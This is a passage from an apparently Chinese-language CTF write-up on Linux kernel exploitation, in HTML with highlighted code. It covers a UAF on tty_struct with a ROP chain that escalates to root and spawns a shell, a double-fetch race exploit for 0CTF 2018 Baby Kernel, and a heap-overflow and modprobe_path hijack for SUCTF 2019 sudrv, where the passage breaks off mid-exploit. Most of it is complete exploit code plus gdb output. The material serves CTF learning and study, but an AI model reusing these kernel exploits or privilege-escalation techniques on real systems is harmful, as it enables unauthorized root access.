class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>思路是利用UAF泄露出部分tty_struct结构体的内容，我们把operation这个结构体指针改成我们伪造的函数结构体指针，在函数结构体指针中按照顺序改三个指针为gadgets和rop，最终在调用write的时候触发这些函数执行劫持控制流，rop之后先改rc4，后面都一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="comment">//FindVmlinuxBase();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="comment">//fake tty operations</span></span><br><span class="line">    <span class="keyword">void</span>* fake_ops[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//UAF to leak the initial tty_struct</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">//now we have a UAF :)</span></span><br><span class="line">    <span class="keyword">int</span> tty_fd = open(<span class="string">"/dev/ptmx"</span>,O_RDWR|O_NOCTTY);<span class="comment">//use the former released one</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_ops;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j &lt; <span class="number">30</span>;j++)</span><br><span class="line">        fake_ops[j] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">    fake_ops[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;<span class="comment">//lookup func</span></span><br><span class="line">    fake_ops[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;<span class="comment">//install </span></span><br><span class="line">    fake_ops[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">//open</span></span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">0x20</span>);<span class="comment">//write back</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(tty_fd,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Double Fetch是一种类似条件竞争的攻击方式，原理是内核在调用用户空间数据的时候可能会先做安全检查，随后调用其数据指针，而第二次取数据处理的时候可能使用被篡改的恶意数据。</p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>flag是编码到bss上的，我们要做的是通过一些校验，即可得到输出的flag。</p>
<p>ioctl主要有两个功能,cmd=0x6666的时候输出flag的地址到dmesg里，cmd=0x1337的时候开始进行校验。检查的内容是指针是否是用户态空间数据，指针内部的flag_str指针是否是用户态数据，非用户态的话会直接返回，第三个检查是flag_str的长度是否和flag长度一致，我们这里利用double fetch的漏洞，先从dmesg里得到flag的地址，之后构造恶意线程不断往用户态的一个数据指针里修改flag_str为内核flag地址，这样在经过三次校验之后有一定几率在校验flag字节前把flag_str改为实际flag地址，之后即可输出flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 arg1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 arg2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 arg22; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, arg1);</span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"Your flag is at %px! But I don't think you know it's content\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(arg2, <span class="number">16L</span>L, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)arg22,</span><br><span class="line">               *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(arg22 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(arg22 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)arg22 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">"Looks like the flag is not a secret anymore. So here is it %s\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">14L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c-2"><a href="#exp-c-2" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* flag;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_finished = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buf[LEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_attr</span><span class="params">(<span class="keyword">void</span>* s)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span>* <span class="title">s1</span> = <span class="title">s</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(!is_finished)</span><br><span class="line">        s1-&gt;flag = flag_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//leak flag address from dmesg</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    system(<span class="string">"dmesg &gt; /tmp/record.txt"</span>);</span><br><span class="line">    <span class="keyword">int</span> dmesg_fd = open(<span class="string">"/tmp/record.txt"</span>,O_RDONLY);</span><br><span class="line">    lseek(dmesg_fd,<span class="number">-0x1000</span>,SEEK_END);</span><br><span class="line">    read(dmesg_fd,buf,LEN);</span><br><span class="line">    close(dmesg_fd);</span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="built_in">strstr</span>(buf,<span class="string">"Your flag is at "</span>);</span><br><span class="line">    <span class="keyword">if</span>(pos == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Not found\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pos += <span class="number">0x10</span>;</span><br><span class="line">    flag_addr = strtoull(pos,pos+<span class="number">0x10</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]flag addr:%p"</span>,flag_addr);</span><br><span class="line">    <span class="comment">//create threads</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    t.flag = buf;</span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    is_finished = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]result:\n"</span>);</span><br><span class="line">    system(<span class="string">"dmesg | grep flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>之前介绍的大部分都是栈的内容，内核堆漏洞也是蛮多的，最简单的莫过于堆溢出，因为slab的分配类似fastbin，我们可以通过溢出覆盖下一个free_chunk的fd两次分配到任意地址。</p>
<h3 id="SUCTF-2019-sudrv"><a href="#SUCTF-2019-sudrv" class="headerlink" title="SUCTF 2019 sudrv"></a>SUCTF 2019 sudrv</h3><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>ioctl给了仨功能，分别是分配、释放和输出堆块内容，其中<code>sudrv_ioctl_cold_2</code>函数有格式化字符串漏洞，可以通过<code>%llx</code>泄露栈上的内容，进而从dmesg里获取泄露的函数相关地址以及栈地址，通过堆溢出(write未检查buf和size)我们可以分配到堆到栈上进行溢出写<code>rop</code>。</p>
<p>除此之外，我们还可以通过劫持<code>modprobe_path</code>不起root shell但是可以以root身份执行任意命令，比如把flag拷贝到/tmp目录下并给777权限之后查看。这个原理是内核在运行异常的时候会调用modprobe_path指向的文件，我们改成自己编写的getflag.sh即可，执行完exp之后手动取执行/tmp/ll(一个格式错误的可执行文件)即可触发读取flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sudrv_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> cmd, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x73311337</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(arg2 - <span class="number">1</span>) &gt; <span class="number">0xFFE</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      su_buf = (<span class="keyword">char</span> *)_kmalloc(arg2, <span class="number">0x480020</span>LL);<span class="comment">// add</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> (<span class="keyword">int</span>)<span class="number">0xDEADBEEF</span>:</span><br><span class="line">      JUMPOUT(su_buf, <span class="number">0L</span>L, sudrv_ioctl_cold_2); <span class="comment">// format string leak address</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x13377331</span>:</span><br><span class="line">      kfree(su_buf);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      su_buf = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sudrv_ioctl_cold_2</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(a1);</span><br><span class="line">  JUMPOUT(&amp;loc_38);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意在这里的modprobe_path在/proc/kallsyms里没有符号，我们可以通过引用找到它<a href="https://www.anquanke.com/post/id/185911#h3-2" target="_blank" rel="noopener">参考</a>，先找到<code>__request_module</code>函数，在gdb里查看函数汇编即可找到<code>modprobe_path</code>。在这里未开kalsr的时候是<code>0xffffffff82242320</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep __request</span><br><span class="line">ffffffff81065210 t __request_resource</span><br><span class="line">ffffffff81065d60 T __request_region</span><br><span class="line">ffffffff810833e0 T __request_module</span><br><span class="line">ffffffff8108378b t __request_module.cold.4</span><br><span class="line">ffffffff810b2c10 T __request_percpu_irq</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/28i 0xffffffff810833e0                                </span><br><span class="line">   0xffffffff810833e0:  push   rbp</span><br><span class="line">   0xffffffff810833e1:  mov    rbp,rsp</span><br><span class="line">   0xffffffff810833e4:  push   r15</span><br><span class="line">   0xffffffff810833e6:  push   r14</span><br><span class="line">   0xffffffff810833e8:  push   r13</span><br><span class="line">   0xffffffff810833ea:  mov    r13,rsi</span><br><span class="line">   0xffffffff810833ed:  push   r12</span><br><span class="line">   0xffffffff810833ef:  movzx  r12d,dil</span><br><span class="line">   0xffffffff810833f3:  push   r10</span><br><span class="line">   0xffffffff810833f5:  lea    r10,[rbp+0x10]</span><br><span class="line">   0xffffffff810833f9:  push   rbx</span><br><span class="line">   0xffffffff810833fa:  mov    ebx,edi</span><br><span class="line">   0xffffffff810833fc:  sub    rsp,0xb8</span><br><span class="line">   0xffffffff81083403:  mov    QWORD PTR [rbp-0x50],rdx</span><br><span class="line">   0xffffffff81083407:  mov    QWORD PTR [rbp-0x48],rcx</span><br><span class="line">   0xffffffff8108340b:  mov    QWORD PTR [rbp-0x40],r8</span><br><span class="line">   0xffffffff8108340f:  mov    QWORD PTR [rbp-0x38],r9</span><br><span class="line">   0xffffffff81083413:  mov    rax,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff8108341c:  mov    QWORD PTR [rbp-0x68],rax</span><br><span class="line">   0xffffffff81083420:  xor    eax,eax</span><br><span class="line">   0xffffffff81083422:  test   dil,dil</span><br><span class="line">   0xffffffff81083425:  jne    0xffffffff810835a6</span><br><span class="line">   0xffffffff8108342b:  xor    r15d,r15d</span><br><span class="line">   0xffffffff8108342e:  cmp    BYTE PTR [rip+0x11beeeb],0x0        # 0xffffffff82242320</span><br><span class="line">   0xffffffff81083435:  jne    0xffffffff8108345e</span><br><span class="line">   0xffffffff81083437:  mov    rcx,QWORD PTR [rbp-0x68]</span><br><span class="line">   0xffffffff8108343b:  xor    rcx,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff81083444:  mov    eax,r15d</span><br><span class="line">gdb-peda$ x/s 0xffffffff82242320</span><br><span class="line">0xffffffff82242320:     &quot;/tmp/getflag.sh&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="exp-c-3"><a href="#exp-c-3" class="headerlink" title="exp.c"></a>exp.c</h4><p>exp来自17学长，在测试这个<code>fastbin</code>分配机制的时候我试了下改size，0x700、0x600和0x900均不行，最后是0x800和0x400成功，挠头.jpg，找了下也没有讲的很好的slab/slub分配机制的文章，回头再说好了。</p>
<p>使用的时候使用管道作为输入<code>printf &#39;\x20\x23\x24\x82\xff\xff\xff\xff&#39; | ./exp</code>，执行完exp之后执行/tmp/ll再<code>cat /tmp/flag</code>即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE 0x73311337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW 0xDEADBEEF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE 0x13377331</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_slab</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> size)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CREATE, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, SHOW, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd, DELETE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"echo -ne 